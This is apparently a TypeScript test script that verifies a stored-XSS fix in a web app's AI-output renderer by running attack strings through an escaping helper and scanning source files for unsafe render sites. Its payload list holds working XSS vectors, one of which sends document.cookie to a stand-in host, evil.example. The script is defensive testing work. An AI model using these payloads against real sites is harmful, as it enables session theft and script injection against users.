// scripts/verify-ai-output-escaping.ts
// ─────────────────────────────────────────────────────────────────────────────
// Proves the D-14 stored-XSS fix: AI output rendered with
// dangerouslySetInnerHTML can no longer introduce markup.
//
//     node --experimental-strip-types scripts/verify-ai-output-escaping.ts
//
// Two halves. First, real payloads through lib/render-ai-output.ts — the
// vectors a learner could paste into the writing checker and have quoted back
// at them, since these prompts ask the model to quote the learner's own words.
// Second, a static sweep proving no render site bypasses the helper, because
// the fix regresses the moment someone writes one more inline .replace().
//
// Pure and offline: no database, no network, no DOM.
// ─────────────────────────────────────────────────────────────────────────────
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  escapeHtml,
  renderAiMarkup,
  renderAiMarkupWithTables,
} from '../lib/render-ai-output.ts';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');

let passed = 0;
let failed = 0;

function check(name: string, ok: boolean, detail = ''): void {
  if (ok) {
    passed++;
    console.log(`  PASS  ${name}`);
  } else {
    failed++;
    console.log(`  FAIL  ${name}${detail ? `\n          ${detail}` : ''}`);
  }
}

/**
 * True when nothing in `html` can act as markup.
 *
 * Strips the tags this code writes, then asserts no angle bracket survives.
 * Substring checks for 'onerror=' or '<script' would be wrong here: escaped
 * output legitimately CONTAINS that text, as inert characters inside entities
 * — `&lt;img src=x onerror=alert(1)&gt;` is a payload rendered harmless, and a
 * test that rejects it is testing the wrong thing.
 */
function noInjectedMarkup(html: string): boolean {
  const stripped = html
    .replace(/<div style="display:grid;[^"<>]*">/g, '')
    .replace(/<\/?(strong|span|div)>/g, '');
  return !stripped.includes('<') && !stripped.includes('>');
}

const PAYLOADS: Array<[string, string]> = [
  ['script tag', '<script>alert(document.cookie)</script>'],
  ['img onerror', '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">'],
  ['svg onload', '<svg/onload=alert(1)>'],
  ['iframe', '<iframe src="javascript:alert(1)"></iframe>'],
  ['event handler on a div', '<div onmouseover="alert(1)">hover</div>'],
  ['closing the attribute we are inside', '"><script>alert(1)</script>'],
  ['style with expression', '<style>body{background:url("javascript:alert(1)")}</style>'],
  ['entity-encoded script', '&lt;script&gt;alert(1)&lt;/script&gt;'],
  ['nested in bold markers', '**<img src=x onerror=alert(1)>**'],
  ['bold marker splitting a tag', '**a**<script>alert(1)</script>**b**'],
  ['link with javascript scheme', '<a href="javascript:alert(1)">click</a>'],
  ['base tag', '<base href="https://evil.example/">'],
];

console.log('\n1. No payload survives as markup');
for (const [label, payload] of PAYLOADS) {
  const out = renderAiMarkup(payload);
  check(
    label,
    noInjectedMarkup(out),
    `rendered: ${out.slice(0, 160)}`
  );
}

console.log('\n2. The same, through the table renderer');
for (const [label, payload] of PAYLOADS.slice(0, 6)) {
  // Wrapped in pipes so the table branch is the one that runs.
  const out = renderAiMarkupWithTables(`| ${payload} | second cell |`);
  check(
    `${label} inside a table row`,
    noInjectedMarkup(out),
    `rendered: ${out.slice(0, 180)}`
  );
}

console.log('\n3. Escaping is correct and ordered');
{
  // check() takes a boolean here, so these are explicit comparisons rather
  // than the (actual, expected) form the other verify scripts use.
  check(
    'ampersand first, so entities are not double-escaped',
    escapeHtml('&lt;') === '&amp;lt;',
    'got ' + escapeHtml('&lt;')
  );
  check('angle brackets', escapeHtml('<b>') === '&lt;b&gt;', 'got ' + escapeHtml('<b>'));
  check('quotes, both kinds', escapeHtml(String.fromCharCode(34, 39)) === '&quot;&#39;');
  check('plain text is untouched', escapeHtml('Week 3 score: 82') === 'Week 3 score: 82');
}

console.log('\n4. Legitimate formatting still works');
{
  check(
    'bold is honoured',
    renderAiMarkup('**Score: 82/100**') === '<strong>Score: 82/100</strong>'
  );
  check(
    'text either side of bold is kept',
    renderAiMarkup('a **b** c') === 'a <strong>b</strong> c'
  );
  check(
    'an ampersand in prose reads as an ampersand',
    renderAiMarkup('Discovery & Stakeholder Pack') === 'Discovery &amp; Stakeholder Pack'
  );
  check(
    'a table row becomes a grid row',
    renderAiMarkupWithTables('| 1 | passive voice | rewrite |').includes('display:grid')
  );
  check('null and undefined render as nothing', renderAiMarkup(null) === '' && renderAiMarkup(undefined) === '');
}

console.log('\n5. No render site bypasses the helper');
{
  function walk(dir: string): string[] {
    const abs = join(ROOT, dir);
    if (!existsSync(abs)) return [];
    const out: string[] = [];
    for (const e of readdirSync(abs, { withFileTypes: true })) {
      if (e.isDirectory()) out.push(...walk(`${dir}/${e.name}`));
      else if (e.name.endsWith('.tsx') || e.name.endsWith('.ts')) out.push(`${dir}/${e.name}`);
    }
    return out;
  }

  // lib/render-ai-output.ts is excluded: it is the helper, so it is the one
  // file that legitimately contains the substitution, and it names
  // dangerouslySetInnerHTML in its own explanation of the bug.
  const HELPER = 'lib/render-ai-output.ts';
  const files = [...walk('app'), ...walk('components'), ...walk('lib')].filter((f) => f !== HELPER);
  const sites = files.filter((f) => readFileSync(join(ROOT, f), 'utf8').includes('dangerouslySetInnerHTML'));

  check('found the render sites', sites.length > 0, `found ${sites.length}`);

  for (const file of sites) {
    const src = readFileSync(join(ROOT, file), 'utf8');
    // Every __html value must come from the helper, and no site may still
    // build markup with an inline replace().
    const usesHelper = /__html:\s*renderAiMarkup(WithTables)?\(/.test(src);
    const inlineStrong = src.includes("'<strong>$1</strong>'");
    check(`${file} uses the helper`, usesHelper, 'a __html value is built some other way');
    check(`  ${file} has no inline <strong> substitution left`, !inlineStrong);
  }
}

console.log(`\n${'─'.repeat(60)}`);
console.log(`${passed} passed, ${failed} failed`);
console.log(`${'─'.repeat(60)}\n`);

if (failed > 0) process.exit(1);
